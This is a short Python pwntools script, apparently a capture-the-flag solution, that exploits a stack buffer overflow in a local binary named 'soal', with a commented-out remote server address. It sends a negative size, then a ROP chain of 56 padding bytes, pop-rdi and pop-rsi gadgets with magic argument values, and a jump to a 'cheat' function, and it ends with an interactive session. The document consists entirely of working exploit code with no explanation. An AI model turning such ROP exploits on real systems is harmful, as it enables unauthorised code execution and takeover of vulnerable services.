from pwn import *


r = process("./soal")
# r = remote("104.248.150.36",11101)
poprdi=0x00000000004013ab
poprsi=0x00000000004013a9
cheat=0x00000000004011e3
# gdb.attach(r,'''
# 	b *0x00000000004011e3
# 	c
# 	''')
r.sendlineafter("laptop ? ","-1")

p='a'*56
p+=p64(poprdi)
p+=p64(0x5045544952504153)
p+=p64(poprsi)
p+=p64(0xdeadbeefdeadbeef)
p+=p64(0)
p+=p64(cheat)
print len(p)
r.sendlineafter("owner : ",p)
r.interactive()
